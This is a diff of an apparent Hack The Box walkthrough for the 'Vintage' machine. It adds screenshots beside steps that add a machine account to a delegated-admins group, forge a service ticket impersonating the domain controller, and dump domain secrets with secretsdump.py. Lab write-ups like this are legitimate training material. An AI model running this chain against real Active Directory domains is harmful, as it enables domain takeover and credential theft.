@@ -186,9 +186,13 @@
 
 `bloodyAD -d vintage.htb -u c.neri_adm -p $(cat c.neri_adm.pass) --host dc01.vintage.htb -k add groupMember DelegatedAdmins 'fs01$'`
 
+<img width="912" height="56" alt="image" src="https://github.com/user-attachments/assets/bf2d147e-6417-4f6a-b1dd-0239acf8bb5f" />
+
 29. Next, we will abuse FS01$'s ability to act on behalf of another identity to get a service ticket impersonating as DC01.
 
 `getST.py -spn 'cifs/dc01.vintage.htb' -impersonate 'DC01$' 'vintage.htb'/'fs01$:fs01' -k`
+
+<img width="912" height="493" alt="image" src="https://github.com/user-attachments/assets/2734f07e-fc3b-4e87-b72c-49fafe2b41bb" />
 
 30. Set the KRB5CCNAME environment variable to use this ticket for kerberos authentication.
 
@@ -198,7 +202,7 @@
 
 `secretsdump.py -k dc01.vintage.htb`
 
-
+<img width="912" height="453" alt="image" src="https://github.com/user-attachments/assets/04c1eb85-e55d-4113-9277-722b41dfb602" />
 
 32. 
 
